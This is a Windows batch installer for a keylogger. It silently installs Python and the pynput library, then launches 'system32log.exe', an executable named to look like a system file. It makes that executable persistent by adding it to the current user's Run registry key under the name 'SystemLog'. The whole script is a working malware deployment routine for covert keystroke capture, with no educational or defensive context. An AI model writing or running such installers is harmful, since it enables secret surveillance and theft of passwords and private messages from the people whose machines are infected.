@echo off
cd /d %~dp0

echo [*] Checking for Python...
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [*] Python not found. Downloading and installing silently...
    powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe -OutFile python_installer.exe"
    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    timeout /t 10
)

:: Refresh the PATH after installation
set PATH=%PATH%;%ProgramFiles%\Python310\Scripts;%ProgramFiles%\Python310\

echo [*] Installing dependencies (pynput)...
python -m pip install --upgrade pip >nul 2>&1
python -m pip install pynput >nul 2>&1

echo [*] Launching keylogger (system32log.exe)...
start "" "%~dp0system32log.exe"

echo [*] Adding to Windows startup...
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemLog /t REG_SZ /d "%~dp0system32log.exe" /f

echo [✓] Installation Complete.
pause
